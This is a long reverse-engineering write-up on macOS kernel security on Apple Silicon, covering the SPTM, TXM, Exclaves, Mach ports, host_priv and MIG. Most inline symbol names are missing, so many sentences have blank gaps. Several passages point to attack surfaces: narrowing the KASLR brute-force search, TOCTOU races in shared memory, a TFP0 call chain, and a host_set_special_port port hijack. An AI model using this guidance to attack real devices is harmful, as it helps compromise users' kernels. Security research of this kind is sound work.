The SPTM returns control to the kernel using  (). This restores the EL2 SPRR configuration and the kernel's stack pointer. Crucially, on the return path, the SPTM and TXM scrub their per-thread state and shared buffers before executing , ensuring that sensitive GL-only data is not left in registers or shared pages exposed to the kernel.4.1.2 The Frame Table (FTE): Tracking Physical RealityTo enforce security, the SPTM cannot rely on the kernel's data structures (like ), as they are mutable by a compromised kernel. Instead, the SPTM maintains its own "God View" of physical memory called the .The Frame Table is a linear array of Frame Table Entries (FTE), located in SPTM-private memory. There is one FTE for every 16KB page of physical RAM (matching the kernel's translation granule).FTE Structure and Domains:
The FTE tracks the state of every physical page, enforcing strict ownership by  (). While the internal enum values evolve, the conceptual types include: Generic kernel heap/stack. Immutable kernel code. A page containing translation entries (TTEs). Memory owned by the Secure World. (SPTM Domain): Internal monitor structures.
The SPTM enforces that a physical page can only be mapped into a virtual address space if the mapping permissions are compatible with the page's Type and Domain. For example, a page marked  cannot be mapped as Executable. A page marked  cannot be mapped as Writable by the kernel.4.1.3 The Dispatch Table: Reverse Engineering the SelectorsThe interface between XNU and the SPTM is a strict, register-based API. However, unlike the stable syscall numbers of the BSD layer, the  are not guaranteed to remain static across macOS versions. Apple frequently rotates these IDs to frustrate static analysis tools.: The  (Domain + Table + Endpoint).: Arguments (Physical Addresses, Permission Bitmasks, ASIDs).Heuristic Identification:
Since relying on static IDs is brittle, reverse engineers must fingerprint the  of the handler functions within the Ap,SecurePageTableMonitor binary to identify the primitives.sptm_retype(ppn, old_type, new_type): Look for a function that accepts a Physical Page Number (PPN), reads the corresponding Frame Table Entry (FTE), and performs a . The SPTM must zero-fill () or cache-invalidate the page before transitioning it from  to  to prevent the kernel from initializing a page table with pre-computed malicious entries.assert(refcount == 0); memset(pa, 0, PAGE_SIZE); fte->type = new_type;sptm_map(asid, va, ppn, perms): Look for a function that walks the translation tables (reading physical memory) and performs a  against the FTE. It will contain logic that explicitly compares the requested  (e.g., Write) against the  (e.g., ).if (fte->type == XNU_TEXT && (perms & WRITE)) panic(); write_tte(...); Look for the  sequence. For SPTM-controlled mappings, TLB invalidation is performed inside GL2 as part of the unmap routine. XNU cannot directly update those page tables and must invoke SPTM to perform any changes, including the corresponding TLB maintenance ( or similar).sptm_map_iommu(dart_id, context_id, dva, ppn, perms): Look for writes to MMIO regions associated with DART controllers, rather than standard RAM. This function validates that the  is not a protected kernel page before mapping it into a device's IOVA space.
Automated analysis scripts should not rely on . Instead, they should symbolically execute the  handler in the SPTM binary, identifying the dispatch table jump via , and then classify the target functions based on the presence of  (cache zero), , or FTE array access patterns.4.1.4  Analyzing Panic Strings and the State MachineThe SPTM is designed to be . Unlike standard kernel APIs that return , the SPTM treats invalid requests as evidence of kernel compromise.
If XNU sends a malformed request (e.g., trying to retype a page that is still mapped), the SPTM returns a fatal error code. XNU, upon receiving this error, triggers a system-wide panic."received fatal error for a selector from TXM" or "invalid state transition". These strings are gold for reverse engineers. They confirm that the SPTM enforces a strict Finite State Machine (FSM) for memory pages.Mapping the State Machine:
By analyzing the panic logic and the allowed transition bitmaps, we can deduce the allowed transitions: →  (Allocation) →  (Retype for MMU use - requires sanitization) →  (Teardown - requires unmapping all entries) →  (KEXT loading - One-way transition!)Any attempt to deviate from this graph (e.g., trying to turn  directly into ) results in an immediate halt. This prevents "Page Table Spraying" and other heap manipulation techniques used to gain kernel execution.4.2 The Trusted Execution Monitor (TXM) – GL0If the SPTM is the brawn—enforcing the physics of memory mapping—the Trusted Execution Monitor (TXM) is the brains. Operating as a privileged Conclave at , the TXM is the supreme arbiter of system policy. It represents the architectural decoupling of “mechanism” from “policy.” While the SPTM handles  a page is mapped, the TXM decides  it is allowed to be mapped executable under a given policy.4.2.1 Decoupling AMFI: Moving Core Code-Signature VerificationHistorically, the Apple Mobile File Integrity (AMFI) kernel extension was the primary enforcement point for code signing. While AMFI still exists to handle complex userland policy checks, in the Tahoe architecture the core cryptographic verification logic for platform and protected code has been lifted out of the kernel and placed into the TXM. TXM’s primary currency of trust is the Code Directory Hash (CDHash).The Verification Flow (conceptual): The kernel (XNU) loads a binary into memory (typed as ). It parses the  load command and calculates the CDHash (typically SHA-256 over the Code Directory). XNU issues a call into the Secure World. The Secure Kernel (GL1) routes this to the TXM (GL0). The kernel passes the CDHash and the physical address range that will back the executable mapping. The TXM consults its internal : CDHashes for immutable OS binaries (kernel collections, dyld shared cache, system daemons shipped in Cryptexes).Loadable / Dynamic Trust Caches: CDHashes for binaries that have been verified previously (third-party apps, JIT regions, auxiliary trust caches). On a , the system enters a “cold path”. The kernel, often assisted by  and , provides the CMS signature blob and certificate chain for the image. TXM performs the cryptographic verification against the relevant Apple root (or Developer ID root) inside the guarded world. On success, the CDHash is inserted into an appropriate trust cache. Once the CDHash is validated according to platform policy, TXM updates its internal state so that the specific physical pages associated with that CDHash are marked as “permitted for execution” when requested with appropriate permissions. When XNU later asks the SPTM to map those pages as Executable (), the SPTM consults TXM (or the trust-cache state driven by TXM). If the pages are not in a state that policy allows to become executable, the SPTM denies the Execute permission, even if EL2 code tries to set it in the PTE.Platform distinction (iOS-class vs macOS):The exact  enforced by TXM/SPTM is platform-dependent:On iOS / iPadOS / watchOS / visionOS, TXM + SPTM implement a hard invariant: only code that is both correctly signed and policy-approved is allowed to become executable. AMFI’s view of “signed or not” is no longer sufficient on its own; the SPTM must agree.On , the platform is explicitly designed to allow arbitrary and ad-hoc user code to run. In that environment:TXM still verifies and tracks  (kernel collections, system frameworks, hardened system daemons) and other code that participates in the system integrity story (e.g. components running with special entitlements or under hardened runtime).SPTM still mediates executable mappings and protects the integrity of page tables and immutable kernel/monitor regions.However, the global “no unsigned code ever executes” property is  applied to general userland on macOS. The set of mappings that SPTM/TXM treat as “must be verified” is narrower and aligned with Apple’s documented policy distinction between macOS and fully locked-down platforms.On , patching the kernel to ignore AMFI errors is no longer a sufficient route to arbitrary unsigned code execution: the SPTM/TXM stack must still bless the mapping. Attempts to create executable mappings for code that TXM has not accepted will fail at the SPTM boundary.On , a kernel compromise can still influence which user binaries run (for example, by weakening or bypassing Gatekeeper and AMFI checks for user processes), and ad-hoc binaries remain architecturally admissible. The SPTM/TXM stack primarily constrains:the integrity of page tables and KIP/KTRR-like regions,the mappings of kernel collections and other protected code, andthe ability of a compromised kernel to subvert those invariants.In all cases, SPTM continues to arbitrate frame typing and protected mappings above EL2. TXM’s policy decisions define which code is  for protection and execution under a given mode; SPTM enforces the resulting invariants in the page-table and DART hardware.4.2.2 The Trust Cache: Static vs. LoadableTo avoid the performance penalty of cryptographic verification on every page fault, the TXM manages the —a database of known-good CDHashes.
This is loaded by iBoot and passed to the TXM during the Secure World initialization. It contains the hashes of every binary in the OS (now encapsulated in the immutable ). This cache resides in Secure World memory and is strictly Read-Only.
These handle third-party applications, JIT regions, and auxiliary updates. When a user launches an app, the TXM verifies the signature once and adds the CDHash to a loadable cache. The kernel queries the Trust Cache via a specific  selector. These caches are mutable structures managed by the TXM. A logic bug in the TXM's management of this cache (e.g., a race condition during entry removal or a hash collision attack) is a high-value target for persistence.4.2.3 Developer Mode Enforcement and Downgrade ProtectionThe TXM is also the guardian of the device's security posture, specifically .In previous iterations, enabling debugging capabilities was often a matter of setting  variables or  (like ). In Tahoe, these states are managed by the TXM.
Enabling Developer Mode requires a reboot and explicit user authorization (Secure Intent via physical buttons). The TXM persists this state (likely via the Secure Enclave's secure storage).
The TXM enforces that the system cannot transition from a "Production" state to a "Developer" state without a full reboot and authentication ceremony. This prevents a kernel-level attacker from dynamically relaxing security policies to load unsigned modules.Furthermore, the  (signed by the SEP) encodes whether the system is in Full, Reduced, or Permissive Security. Early-boot components (LLB/iBoot) will refuse to start macOS without a valid LocalPolicy, preventing silent downgrades of security policy. At runtime, the TXM consults this configuration when deciding which code-signing and trust-cache policies to enforce.5.0 XNU Kernel Initialization: Entering EL2The handoff from iBoot to the XNU kernel marks the transition from a single-threaded bootloader to a symmetric multiprocessing (SMP) operating system. However, in the Tahoe architecture, this is no longer a handover of absolute power. On modern macOS configurations (where XNU typically executes at  using Virtualization Host Extensions), the kernel enters not as a master, but as a client of the  monitor.The entry point is defined in . At this precise moment, the system state is fragile: the MMU is operating under a minimal bootstrap mapping provided by iBoot (or disabled entirely depending on the specific SoC generation), interrupts are masked ( bits set), and the stack pointer is essentially arbitrary. The kernel's first objective is to orient itself within physical memory, calculate the KASLR slide, and establish the virtual memory structures required to turn on the lights.5.1 The  routine and KASLRThe  symbol is the architectural entry point. Unlike x86_64, where the kernel might handle its own decompression and relocation, the Apple Silicon kernel is loaded as a raw Mach-O executable (within the  container) directly into physical memory by iBoot.The Register State at Entry:: Indicates EL2 (on standard macOS Tahoe configurations).: Physical address of the  structure (version 2).: Physical address of the Device Tree base (if not inside ).: 0 (Reserved/Empirically observed).: 0 (Reserved/Empirically observed).5.1.1 Deriving the Kernel Slide: The Decoupled Address SpaceKernel Address Space Layout Randomization (KASLR) on Apple Silicon is a cooperative effort between iBoot and XNU. iBoot generates a high-entropy value from the TRNG, populates the  property in the Device Tree, and physically relocates the kernel text in DRAM to match this slide.
Upon entry at , the kernel immediately parses the  structure pointed to by . This structure acts as the handover manifest, containing:: The  virtual base address where the kernel is mapped (i.e., the static base plus the slide).: The actual physical load address in DRAM.
The kernel calculates its own slide by comparing the runtime virtual base provided by iBoot against its compile-time static base:$$ \texttt{vm\_kernel\_slide} = \texttt{boot\_args.virtBase} - \texttt{STATIC\_KERNEL\_BASE} $$The Tahoe Constraint: Address Space Decoupling:
In the Tahoe architecture, the system operates under a paradigm of . The SPTM (GL2) and the Kernel (EL2) reside in the same physical DRAM but operate in distinct translation regimes. The kernel runs under  (or  with VHE), with a virtual layout randomized by . The SPTM runs under the  translation regime with its own independent set of translation table base registers.
This separation is critical. A kernel-level memory leak (e.g., an  revealing a kernel pointer) allows an attacker to calculate . In previous architectures, if the monitor (PPL) was mapped at a fixed offset relative to the kernel, a kernel leak would instantly reveal the monitor's location.In Tahoe, knowing  yields  about the virtual address of the SPTM. The SPTM's virtual mapping is established by iBoot in the GL2 context before the kernel executes. While the kernel is aware of the SPTM's  pages (marked as "Reserved" in the memory map), it is architecturally blind to the SPTM's  location.RE Focus: Finding the Slide:
For a reverse engineer with a kernel panic log or a JTAG connection, identifying these slides requires inspecting distinct registers: Inspect  (or  if VHE is active). The translation table base points to the physical location of the kernel's L1 table. The high bits of the PC (Program Counter) at the exception vector reveal the virtual slide. This is invisible from EL2. To find it, one must inspect the GL2-specific TTBRs via JTAG while the core is halted in the GL2 context. The  global variable in XNU is one of the first initialized. In a raw memory dump, locating the  struct (often at the start of a physical page aligned to 16KB) will reveal the  directly.5.1.2 Initializing the MMU:  and the SPTM HandshakeBefore the kernel can execute C code safely, it must enable the Memory Management Unit (MMU). On standard ARMv8, this involves populating translation tables and writing to  and , then setting .On Tahoe, this process is fundamentally altered because the kernel cannot write to its own page tables.
How does the kernel build its initial page tables if it requires the SPTM to map pages, but the SPTM requires the kernel to make hypercalls?The Solution: The Bootstrap Tables:
iBoot installs a minimal set of  before handing off control. These tables typically contain identity mappings for the PC and stack, allowing the kernel to execute the initialization code required to bring up the SPTM interface. The kernel configures the Translation Control Register ().
 Defines the size of the virtual address space (typically 48-bit on macOS). Granule size (16KB is standard for Apple Silicon). Intermediate Physical Address Size (matches the SoC capability, e.g., 40 bits). Typically configured to allow the top byte (bits 63-56) to carry metadata (such as PAC signatures or tags) without affecting address translation.The SPTM Handshake (The First ):
Once  is configured, the kernel must transition from the iBoot-provided bootstrap tables to its own managed tables. The kernel allocates physical pages for the new L1/L2/L3 translation tables from the  pool. The kernel zeroes these pages. The kernel executes  (Selector  - ) to convert these pages from  to . The kernel executes  (Selector  - ) to populate the entries, replicating the kernel text and static data mappings. Finally, the kernel programs the appropriate  (EL1 or EL2 depending on configuration) to point to the new L1 table. The SPTM constrains the actual effect via SPRR/GXF.
The final step of  is writing to the System Control Register (). Set to 1. Set to 1.In Tahoe, writes to  are mediated by GL2/SPTM (via GXF’s control over system registers). GL2 enforces that configurations keep  set, preventing EL2 from creating writable-executable mappings even if compromised. If the kernel attempts to disable , the SPTM rejects the configuration and panics the device.Once the MMU is active and the kernel is running on its own page tables (managed by SPTM), the  routine branches to , beginning the high-level initialization of the BSD subsystem and IOKit.5.2 Hardware Security Enforcements (The "Kill Switch" Registers)As the kernel initialization sequence progresses through , it reaches a critical inflection point. The memory management structures are initialized, and the kernel is about to transition from a setup phase to a runtime phase. To prevent a compromised runtime kernel from modifying its own logic, the initialization routine must engage the hardware "Kill Switches."In the Tahoe architecture, this protection is layered:  provides the physical baseline,  defines the boot-time immutable regions, and the  virtualizes and extends these concepts to enforce dynamic immutability.5.2.1 KTRR (Kernel Text Read-Only Region): The Physical LockKernel Text Read-Only Region (KTRR) is Apple’s hardware solution to the "W^X" (Write XOR Execute) problem at the physical memory controller level. While the MMU (via page tables) controls virtual access permissions, page tables are mutable data structures. KTRR enforces read-only permissions for a physical range corresponding to kernel text, below the level of page tables. Even if an attacker can mutate PTEs, writes into the KTRR physical region are blocked or faulted.
KTRR is controlled via a set of proprietary system registers, typically accessible via  instructions. (): Defines the physical start address of the protected range. (): Defines the physical end address. (): The kill switch. Writing  to the lock bit enables the protection.The Tahoe Evolution (Virtualization of KTRR):
On M3/M4 chips running the SPTM, the kernel's interaction with KTRR changes. It is highly probable that the SPTM virtualizes these registers using GXF traps. When XNU executes the legacy instructions to write to  in , the hardware traps these accesses to GL2. The SPTM validates that the kernel is attempting to cover the correct physical range and enforces its own policy, effectively mocking the success of the operation to the kernel while ensuring the hardware is locked down.RE Focus: The KTRR Slide Alignment
Because KTRR operates on physical ranges with large granularity (e.g., 1MB or L2 cache line boundaries), the KASLR slide is forced to align to this granularity. If you are brute-forcing the KASLR slide, knowing the KTRR alignment constraint significantly reduces the entropy search space.5.2.2 Kernel Integrity Protection (KIP) and SPTM SealingKTRR protects the static kernel binary (). However, modern macOS relies heavily on the Boot Kernel Collection (BKC) and Auxiliary Kernel Collection (AKC)—large caches of drivers and extensions loaded during boot.
Apple documentation refers to Kernel Integrity Protection (KIP) as a hardware feature where the memory controller defines a protected region into which iBoot loads the kernel and kernel extensions, then denies writes after boot. This serves as the static anchor for the BKC.SPTM Dynamic Sealing ():
The SPTM generalizes this concept to support dynamic loading. Unlike static KTRR/KIP regions, the SPTM maintains a  where pages can be typed. During , the kernel links and relocates extensions. The kernel issues a  call (Selector  or ) to "seal" the region. The SPTM updates the Frame Table Entries (FTE) for the physical pages backing the drivers, transitioning them from  (Writable) to  (Executable/Read-Only).
The security invariant enforced here is that memory typed as  is  writable by EL2. If the kernel attempts to write to a sealed page, the  configuration for EL2 triggers a permission fault. This effectively turns the kernel extensions into ROM, mitigating rootkits that historically operated by patching IOKit vtables in memory.5.2.3 The System Control Register () LockdownThe final "Kill Switch" is the configuration of the ARM processor itself. The  register controls the MMU, caches, and alignment checks. Bit 19. When set, any memory region mapped as Writable is implicitly treated as Non-Executable ().The Trap-and-Emulate Policy:
In a standard ARM system, EL2 can modify  at will. In the Tahoe architecture, writes to  are mediated by GL2/SPTM via GXF’s control over system registers. The effective policy under normal operation is that : GL2/SPTM will not accept configurations that clear  to create writable–executable regions. If the kernel attempts to program  with  cleared, the requested configuration is rejected by the monitor and, in current implementations, this manifests as a system panic rather than a silent relaxation of protections. This ensures that the fundamental security properties of the execution environment (in particular W^X) cannot be disabled, even by a compromised kernel.5.3 Exclaves: The Microkernel within the MonolithThe introduction of  in the Tahoe architecture represents the most profound structural change to the Apple OS ecosystem since the transition from Mac OS 9 to OS X. It is an admission that the monolithic kernel architecture (XNU) has become too large, too complex, and too mutable to serve as the ultimate Trusted Computing Base (TCB) for high-value assets.Exclaves introduce a  running side-by-side with the monolithic XNU kernel on the same Application Processor cores. Unlike the Secure Enclave (which is a separate coprocessor), Exclaves harness the full performance of the M-series cores while maintaining cryptographic isolation enforced by the SPTM.5.3.1 The L4 Influence: Domains, Conclaves, and IPCThe architecture of the Exclave system is heavily indebted to the  family. It prioritizes minimalism, capability-based security, and strict isolation.The Hierarchy of Isolation:The Secure Kernel (): A tiny, formally verifiable kernel that manages scheduling and IPC within the secure world. It runs at . The highest level of separation. The "Insecure Domain" hosts XNU and userland (EL2/EL0). The "Secure Domain" hosts Exclave workloads. Within the Secure Domain (GL0), workloads are siloed into . A Conclave is a lightweight container consisting of an address space, a set of capabilities (handles to resources), and threads.Memory Management via SPTM:
The isolation is enforced by the SPTM's Frame Table. Physical pages assigned to an Exclave are typed in the FTE (likely as  or ). The kernel sees these physical pages as "reserved" in the device tree. Any attempt by XNU to map these pages via  will result in a panic, as the SPTM forbids mapping Exclave-owned pages into the .5.3.2  The  Mechanism and For the reverse engineer, the critical question is: How does the Kernel talk to an Exclave? They share no virtual memory, run in different hardware contexts, and the SPTM actively prevents XNU from mapping Exclave physical pages. The bridge is a mechanism internally referred to by researchers as , facilitated by a component named .
Apple has introduced a new Interface Definition Language (IDL) called . It replaces the legacy Mach Interface Generator (MIG) for secure world communication. Tightbeam is strongly typed and buffer-centric. The serialization logic is visible in /usr/lib/libTightbeam.dylib. appears both as an XNU-side component and as related services in the secure world, bridging Mach ports to Exclave endpoints.The Downcall (XNU → Exclave):
When XNU needs a service, it cannot call the function directly. serializes the request using Tightbeam into a shared memory ring buffer. The kernel executes a specific instruction to trigger the world switch. This is a  instruction targeting a specific Dispatch ID reserved for the Secure Kernel. The hardware (mediated by SPTM) saves the EL2 state, switches the SPRR configuration to the Exclave view, and jumps to the  entry point (GL1).The Upcall (Exclave → XNU):
Exclaves rely on XNU for file system I/O or networking.The Exclave writes a request to the outbound ring buffer.It triggers an interrupt or executes a  yield. receives the notification, reads the request, performs the operation via standard VFS calls, and returns the result via a Downcall.Memory Loaning (The "DART" Window):
While control messages go through ring buffers, large data transfers occur via .  pins a userland page and passes its physical address to the Exclave via Tightbeam. The Exclave requests the SPTM to map this specific PPN into its address space. This "Loaned Memory" mechanism is a prime target for TOCTOU (Time-of-Check to Time-of-Use) attacks, as the ownership transitions are complex and mediated by the SPTM state machine.5.3.3 Use Case: Secure Control of Privacy Indicators and PasskeysThe "Killer App" for Exclaves in macOS Tahoe is the hardware-enforced privacy indicator (the green/orange dots).Reverse engineering of current macOS Tahoe builds strongly suggests that these indicators are implemented using an Exclave-controlled overlay path along the following lines: The physical framebuffer region corresponding to the status bar indicators is, in current implementations,  in the XNU domain. It appears to be owned exclusively by a specific  (GL0), so that only secure-world code can directly address the pixels used for the indicators. The Display Coprocessor's IOMMU (DART) is configured under SPTM control such that the main display pipe used by XNU and WindowServer cannot write to the indicator pixels. Only a secure overlay pipe, controlled by the Exclave domain, is allowed to source scanout data for that region. Under this design, XNU cannot map the physical memory backing the secure overlay, and it cannot reconfigure the relevant DART contexts without going through SPTM policy. As a result, a compromised kernel is effectively unable to erase or suppress the indicator once the secure pipeline has decided it should be visible.
Similarly, passkey operations are increasingly implemented inside Exclave-backed services. The key material for Passkeys is generated and stored in hardware-isolated domains (SEP plus, on newer platforms, Exclave-backed services), with XNU only ever handling opaque identifiers or tokens rather than raw private keys. Even if malware injects code into the  daemon or the kernel, it cannot extract the private key material, because it resides in a memory domain that the Normal World cannot directly address.6.0 The Mach Subsystem: The Nervous SystemWhile the SPTM and Exclaves represent the new fortress walls of the Apple Silicon architecture, the  subsystem remains the internal nervous system that coordinates activity within the XNU kernel. Originating from the NeXTSTEP era, Mach provides the fundamental primitives for Inter-Process Communication (IPC), thread scheduling, and virtual memory management.For the reverse engineer, Mach is the primary vector for local privilege escalation (LPE). Despite decades of hardening, the complexity of state management in Mach messaging remains a fertile ground for logic bugs, race conditions, and reference counting errors. In the Tahoe era, Mach has been retrofitted with heavy PAC enforcement to protect its object graph.6.1 Mach Ports & IPC PrimitivesAt the conceptual level, Mach is an object-oriented kernel. The fundamental unit of addressing is the . To a userland process, a port is merely a 32-bit integer handle (). To the kernel, it is a complex, reference-counted data structure () that acts as a unidirectional communication channel.6.1.1 Port Rights: Receive, Send, Send-Once, and Dead NamesThe security model of Mach is capability-based. Possessing a port name is meaningless without the associated . The kernel tracks these rights in the process's IPC space. The ownership right. Only one task can hold the Receive right for a specific port at any given time. This task is the destination for messages sent to the port.
 The  struct contains a pointer () to the  of the task holding this right. The ability to queue messages into the port. Multiple tasks can hold send rights to the same port. This is the standard "client" handle.MACH_PORT_RIGHT_SEND_ONCE: A "fire-and-forget" right that vanishes after a single message is sent. This is critical for the Request/Reply pattern (RPC). When a client sends a message, it typically includes a  right to its own reply port. The server uses this to send exactly one reply, preventing the server from spamming the client later.MACH_PORT_RIGHT_DEAD_NAME: If the task holding the Receive right dies or destroys the port, all outstanding Send rights in other tasks are instantly transmuted into Dead Names. Any attempt to send a message to a dead name returns .RE Focus: The  Structure and PAC:
In previous generations, a common exploit technique involved "Fake Ports"—spraying the heap with crafted data that looked like an  struct and then tricking the kernel into using it.In the arm64e/Tahoe architecture, the  structure is heavily fortified: The base header of the port. A pointer to the underlying kernel object (e.g., a task, a thread, or a user-client). This pointer is PAC-signed. A 64-bit context value, also PAC-signed.If an attacker attempts to forge a port, they must generate a valid signature for the  pointer. Without the  (Data Key A), the kernel will panic upon  execution during message delivery.6.1.2 The IPC Space () and the Global Name ServerEvery task (process) in macOS has an associated  (). This structure acts as the translation layer between userland integer handles () and kernel objects (, , etc.).The Translation Table ():
Each IPC space is backed by a dynamically sized array of  (), commonly referred to as the  / .
The userland handle (e.g. ) encodes:A  into the , andHigh-order generation bits used to detect stale handles.
Each entry contains (simplified):: A pointer to the underlying  or . On arm64e/Tahoe, this pointer is protected with pointer authentication (PAC) so that corruption of the raw bits does not yield a usable kernel pointer.: A bitfield encoding:Rights (send, receive, send-once, etc.).The generation count for that slot.Additional flags (e.g. dead-name state).The Lookup Process ():
When a thread executes  to send to some :The kernel retrieves the current task’s IPC space:ipc_space_t space = current_task()->itk_space;It decodes the  to obtain the index and generation and indexes into .Generation matches the high bits of the name?Required right present (e.g.  for a send).On arm64e, it authenticates the  pointer using the appropriate kernel PAC key and context.If all checks succeed, it obtains the  and proceeds with message delivery.This indirection is what allows the kernel to revoke or recycle ports while making stale userland handles harmless: the generation mismatch will cause lookups to fail instead of returning the wrong object.
Mach itself does  implement a string-based global namespace in the kernel. The kernel only knows about ports and rights; it does not know what  means.The mapping from string service names →  is implemented entirely in userland by the , which on macOS is .
The kernel does maintain a small set of “special ports” on host and task objects. Relevant here:: A send right representing the host ().: The privileged host port (see Section 6.2).: The task’s handle to the bootstrap server (typically a port managed by  for that task’s domain).bootstrap_look_up(bootstrap_port, "com.apple.foo", &service_port);
or uses the XPC equivalent, it is really sending a Mach message to whatever port is stored in its  slot.  receives that message and resolves  into a Mach port according to its internal job graph and policy.6.1.3 Copy-on-Write (CoW) optimizations in Out-of-Line (OOL) message passingMach messages are not limited to small scalars. They can transfer massive amounts of data using  descriptors. This mechanism relies on Virtual Memory (VM) tricks rather than data copying, making it highly efficient but historically dangerous. Includes a mach_msg_ool_descriptor_t in the message, pointing to a buffer in its address space (e.g., 100MB of data). The kernel does  copy the 100MB. Instead, it walks the sender's VM map. The kernel marks the physical pages backing that buffer as  in the sender's map. The kernel maps those  into the receiver's address space, also as . If either the sender or receiver tries to write to the buffer, the MMU triggers a fault. The kernel catches this, allocates a new physical page, copies the data, and updates the mapping for the writer. This preserves the illusion of a copy.The Tahoe/SPTM Intersection:
In the Tahoe architecture, this VM manipulation is complicated by the SPTM. When the kernel marks the pages as CoW (Read-Only), it cannot simply update the PTEs. It must issue a  call ( or ) to the SPTM to downgrade the permissions of the physical pages in the sender's address space. This complexity introduces a race window. If the kernel logic fails to correctly lock the VM map object before requesting the SPTM update, or if the SPTM state machine has a logic flaw regarding shared pages (), it might be possible to modify the physical page  the message has been "sent" but before the receiver reads it. This is known as a  or Physically-Backed-Virtually-Disjoint attack.
Analyze  and  in the XNU source (or binary). Look for how  structures are flagged with  and how these flags translate into SPTM calls. The interaction between Mach IPC (which assumes it controls VM) and the SPTM (which actually controls VM) is the friction point where new bugs will likely emerge.In the lexicon of XNU exploitation, the  () has historically been synonymous with “Game Over.” It is  the kernel task port itself; rather, it is a privileged Mach port on the global  () that unlocks host-level operations and special ports. In older exploitation chains,  was often the stepping stone to obtain a send right to  (TFP0) via interfaces such as  or .6.2.1 The “God Mode” Handle: Generation and RestrictionThe  port is backed by the kernel’s global  (). Unlike a task port, which maps to a , the  port is a privileged view of the host object that unlocks host-level operations (for example, access to special ports and certain system configuration controls).During early bootstrap in , XNU initializes the host subsystem:
Allocates and initializes the  structure.
Calls  (or equivalent helpers) to create the Mach port for the host.
Associates the  pointer with the port’s  / context fields.The  (or related kobject pointer) is stored as a PAC-signed kernel pointer, using one of the kernel’s data-pointer keys with the port address (or similar) as context.This prevents simple “write some other kernel address into ” attacks, even given a raw kernel read/write primitive: tampered pointers will not authenticate when used.The system is conservative about who gets . Typical holders are:
Owns the receive right for the host-privileged port.Privileged daemons (for example, , ):
Obtain send rights to  via host_get_host_priv_port() or the special-port mechanism, so they can:manage special ports (, ), andperform host-level operations on behalf of the rest of the system.The exact set of daemons that receive  can vary by OS release, but it is a very small, explicitly entitled group.The “TFP0” chain in TahoeHistorically, a common pattern was:host_get_host_priv_port(mach_host_self(), &host_priv);
task_for_pid(mach_task_self(), 0, &kernel_task_port);
On modern macOS / Tahoe, several layers weaken this chain: and SIP:
Even if a caller presents ,  is gated by System Integrity Protection (SIP) and related policy hooks. With SIP enabled, conversion to  is denied for untrusted callers.Immutable kernel regions via KIP/SPTM:
Even if an attacker somehow:bypasses SIP/task conversion checks, andobtains a  port,the system’s integrity protections still constrain what that port can do safely:code pages in the Kernel Integrity Protection (KIP) region are loaded and marked read-only by iBoot/SPTM,page tables and “data-const” regions are protected by SPTM frame typing,attempts to use  /  to modify such protected regions can trigger integrity violations and system panic rather than giving persistent arbitrary code execution.In effect, on Tahoe-era systems,  is a high-leverage control primitive and a prerequisite for a number of powerful operations, but it is no longer, by itself, a trivial “write-anywhere in kernel text” primitive once KIP/SPTM and SIP are taken into account.6.2.2 Task Special Ports: The Privileged DirectoryWhile  itself is restricted, it is also the gateway into a table of  that act as privileged entry points for various subsystems. These ports are accessed via  and .Internally, the  structure maintains an array such as:ipc_port_t special[HOST_MAX_SPECIAL_PORT + 1];
where specific indices are reserved for particular subsystems.Critical special ports (by name)A non-exhaustive set of important host special ports:
Port used by the kernel to talk to the automounter () to initiate filesystem mounts.
Control port for the sandbox subsystem ( / ). Possession of this port gives a daemon the ability to receive sandbox configuration and policy messages.
Port used for communicating with the kernel extension manager ( / ). Historically has been involved in flows that could be abused to force loading of kexts; on Tahoe, these flows are constrained by driver signing, KCs, and TXM/LocalPolicy.
Port used to talk to the Apple Mobile File Integrity daemon () for code-signing validation requests.The actual numeric IDs (indices into ) for these ports are defined in headers like  and are  simple small integers like 1 or 7; they are offsets from HOST_MAX_SPECIAL_KERNEL_PORT. For most reverse-engineering and exploitation work, the symbolic names and behaviors matter more than the concrete index values.RE Focus: The  trapA classic post-exploitation idea is:Overwrite a host special port (e.g. the KEXTD port) with a port you control, so you can intercept kernel upcalls intended for that subsystem.If an attacker can get  and then call:host_set_special_port(host_priv,
                      HOST_KEXTD_PORT,
                      attacker_port);
the kernel will now send all “kextd” notifications to  instead.Mitigations in modern macOS include:Entitlement and policy gating: is restricted:It requires a host-privileged port.It is further gated by entitlements and code-signing checks; in practice, only  and a very small number of highly privileged system daemons are allowed to call it successfully.Confused-deputy / race hardening:
Attackers therefore look for:Bugs that allow racing or bypassing entitlement checks.Confused-deputy situations where a daemon that  have the entitlement can be coerced into calling  with an attacker-controlled port name.From a reversing perspective, mapping which daemons hold both  and the relevant private entitlements is a critical part of understanding the real attack surface around .6.2.3  Fuzzing Mach Message Parsing (MIG)Since  exposes a wide attack surface via the Mach IPC interface, it is a primary target for fuzzing. The kernel handles these messages using the Mach Interface Generator (MIG).The  Routine:
When a message is sent to , the kernel's IPC dispatcher calls . This is an auto-generated function that deserializes the Mach message and dispatches it to the implementation (e.g., ).Vulnerability Classes in MIG: MIG relies on the message header to define the size and type of arguments. If the userland client sends a malformed message (e.g., claiming a descriptor is OOL memory when it is actually inline data), the kernel's unmarshaling logic might misinterpret the data, leading to heap corruption.Reference Counting Leaks: If a MIG routine returns an error (e.g., )  it has incremented the reference count on a port or VM object but  it consumes it, the object leaks. In the kernel, this can lead to a refcount overflow (though 64-bit refcounts make this hard) or a Use-After-Free if the cleanup logic is flawed. As discussed in Section 6.1.3, if the message includes Out-of-Line memory, the kernel maps it Copy-on-Write. If the MIG handler verifies the content of the memory and then uses it later, the userland process might be able to race the kernel and modify the physical page (via a side-channel or SPTM state confusion) between the check and the use.
In the Tahoe kernel, MIG-generated code has been hardened with . The dispatch tables used by  are signed. The  structure (representing the message in flight) is heavily protected to prevent modification of the message contents after validation but before processing.However, logic bugs in the  of the host calls (the C functions called by MIG) remain reachable. For example,  allows manipulating CPU sets. If the logic fails to account for a processor being in a low-power state or being managed by an Exclave, it could trigger an inconsistent state in the scheduler.7.0 IOKit & Driver ArchitectureWhile the Mach subsystem provides the primitives for IPC and scheduling,  provides the object-oriented framework for device drivers. Historically, IOKit has been the "soft underbelly" of the XNU kernel. Written in a restricted subset of C++, it relies heavily on virtual function dispatch, complex inheritance hierarchies, and manual reference counting (/).In the Tahoe architecture, IOKit has undergone a radical hardening process. The transition to Apple Silicon has allowed Apple to enforce strict Control Flow Integrity (CFI) on C++ objects using PAC, while Kernel Integrity Protection (KIP) enforces the immutability of the driver code itself, with the  protecting the page tables that describe those regions.The initialization of IOKit is the bridge between the static hardware description provided by iBoot (the Device Tree) and the dynamic, runtime object graph that constitutes the macOS driver environment.7.1.1 The IORegistry: Populating the 